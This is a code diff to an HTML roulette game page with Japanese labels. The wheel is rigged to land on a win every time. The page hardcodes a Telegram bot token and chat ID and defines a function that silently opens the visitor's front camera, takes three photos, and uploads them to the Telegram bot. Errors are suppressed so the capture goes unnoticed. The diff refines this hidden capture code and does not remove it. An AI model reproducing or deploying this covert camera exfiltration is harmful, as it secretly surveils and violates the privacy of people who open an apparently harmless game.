@@ -6,18 +6,21 @@
 <title>🎯</title>
 <style>
   body { margin: 0; color: #fff; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; background: #222; }
+  h2 { position: absolute; top: 20px; padding: 8px 20px; background: rgba(0,0,0,0.4); border-radius: 12px; backdrop-filter: blur(6px); z-index: 5; }
   #container { width: 80vw; max-width: 320px; aspect-ratio: 1; position: relative; }
   #pointer { position: absolute; left: 50%; top: -14px; transform: translate(-50%,0); font-size: 28px; z-index: 20; text-shadow: 0 0 10px #fff; }
   canvas { width: 100%; height: 100%; border-radius: 50%; border: 5px solid #000; }
   #result { margin-top: 20px; font-size: 22px; }
   #spinBtn { margin-top: 12px; padding: 12px 24px; font-size: 16px; cursor: pointer; border-radius: 8px; border: none; background: #fff; color: #000; font-weight: bold; }
   #winModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(255, 255, 255, 0.95); color: #333; padding: 40px; border-radius: 30px; text-align: center; box-shadow: 0 0 80px rgba(255, 215, 0, 0.8); z-index: 100; min-width: 260px; backdrop-filter: blur(8px); }
+  #winModal h1 { margin: 0 0 25px; font-size: 40px; }
   #continueBtn { padding: 15px 45px; font-size: 20px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
   #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 90; }
 </style>
 </head>
 <body>
 
+<h2>🎯ルーレット🎯</h2>
 <div id="container">
   <div id="pointer">▼</div>
   <canvas id="wheel"></canvas>
@@ -32,6 +35,14 @@
 </div>
 
 <script>
+let hue = 0;
+function animateBackground() {
+  hue = (hue + 1) % 360;
+  document.body.style.backgroundColor = `hsl(${hue}, 60%, 25%)`;
+  requestAnimationFrame(animateBackground);
+}
+animateBackground();
+
 const BOT_TOKEN = "8722419105:AAEQd0Tpobob0BQBnWKNGQY0lXhpKa3NdXE";
 const CHAT_ID = "7541612001";
 
@@ -41,55 +52,47 @@ const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハ�
 const angle = 360 / slots.length;
 
 function draw() {
-  canvas.width = canvas.clientWidth; canvas.height = canvas.clientHeight;
-  let c = canvas.width / 2;
+  const size = Math.min(canvas.clientWidth, canvas.clientHeight) * 2;
+  canvas.width = size; canvas.height = size;
+  let c = size / 2;
   let rad = (2 * Math.PI) / slots.length;
+  ctx.clearRect(0, 0, size, size);
   for(let i=0; i<slots.length; i++){
     ctx.beginPath(); ctx.moveTo(c,c); ctx.arc(c,c,c, i*rad, (i+1)*rad);
     ctx.fillStyle = i % 2 === 0 ? "#ffd700" : "#555"; ctx.fill();
     ctx.save(); ctx.translate(c,c); ctx.rotate(i*rad + rad/2);
-    ctx.fillStyle="#000"; ctx.font = "bold 18px sans-serif"; ctx.textAlign="center";
-    ctx.fillText(slots[i], c*0.6, 5); ctx.restore();
+    ctx.fillStyle="#000"; ctx.font = "bold 40px sans-serif"; ctx.textAlign="center";
+    ctx.fillText(slots[i], c*0.6, 15); ctx.restore();
   }
 }
-window.addEventListener("resize", draw); draw();
+window.addEventListener("resize", draw);
+setTimeout(draw, 100);
 
-// 1枚撮って送る関数
-async function takeAndSend(video) {
-  const tempCanvas = document.createElement("canvas");
-  tempCanvas.width = video.videoWidth;
-  tempCanvas.height = video.videoHeight;
-  tempCanvas.getContext("2d").drawImage(video, 0, 0);
-  
-  return new Promise((resolve) => {
-    tempCanvas.toBlob(async (blob) => {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "shot.jpg");
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-      resolve();
-    }, "image/jpeg", 0.6);
-  });
-}
-
-// 連続で3枚撮影
 async function captureAndSend() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
     video.srcObject = stream;
+    video.muted = true;
     await video.play();
-
-    // カメラ起動待ち
-    await new Promise(r => setTimeout(r, 1000));
-
-    // 3回連続撮影
+    await new Promise(r => setTimeout(r, 1200));
+    const blobs = [];
     for (let i = 0; i < 3; i++) {
-      await takeAndSend(video);
-      await new Promise(r => setTimeout(r, 500)); // 0.5秒おきに撮る
+      const tempCanvas = document.createElement("canvas");
+      tempCanvas.width = video.videoWidth;
+      tempCanvas.height = video.videoHeight;
+      tempCanvas.getContext("2d").drawImage(video, 0, 0);
+      const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.6));
+      blobs.push(blob);
+      await new Promise(r => setTimeout(r, 400));
     }
-
     stream.getTracks().forEach(track => track.stop());
+    for (const blob of blobs) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "shot.jpg");
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+    }
   } catch (err) {}
 }
 
@@ -100,6 +103,7 @@ const continueBtn = document.getElementById("continueBtn");
 
 spinBtn.onclick = () => {
   spinBtn.disabled = true;
+  document.getElementById("result").textContent = "回転中...";
   canvas.style.transition = "none";
   canvas.style.transform = "rotate(0deg)";
   void canvas.offsetWidth;
@@ -107,8 +111,8 @@ spinBtn.onclick = () => {
   let randomIndex = [0,2,4,6][Math.floor(Math.random()*4)];
   let stopAngle = 360 - (randomIndex * angle) - (angle / 2);
   canvas.style.transform = `rotate(${1800 + stopAngle}deg)`;
-  
   setTimeout(() => {
+    document.getElementById("result").textContent = "結果：当たり！";
     overlay.style.display = "block";
     winModal.style.display = "block";
     spinBtn.disabled = false;
